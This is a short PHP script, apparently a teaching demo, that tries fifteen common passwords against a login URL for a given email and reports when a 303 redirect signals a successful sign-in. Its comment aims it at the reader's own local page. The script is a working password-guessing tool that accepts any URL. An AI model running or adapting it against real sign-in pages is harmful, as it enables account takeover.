<?php
declare(strict_types=1);

// A password-guessing script, aimed at your own sign-in page on your own
// computer: php guess.php http://localhost:8000/naive-login.php alice@example.com
[, $url, $email] = $argv + [null, '', ''];

$guesses = ['123456', 'password', 'qwerty', 'letmein', 'iloveyou', 'monkey', 'dragon',
    'sunshine', 'princess', 'football', 'baseball', 'welcome', 'shadow', 'master',
    'correct horse battery staple'];

foreach ($guesses as $n => $guess) {
    $context = stream_context_create(['http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query(['email' => $email, 'password' => $guess]),
        'follow_location' => false,
        'ignore_errors' => true,
    ]]);
    file_get_contents($url, false, $context);
    $status = $http_response_header[0] ?? '';

    printf("%2d  %-30s %s\n", $n + 1, $guess, $status);
    if (str_contains($status, ' 303')) {
        echo "Got in.\n";
        exit;
    }
}
echo "Didn't get in.\n";
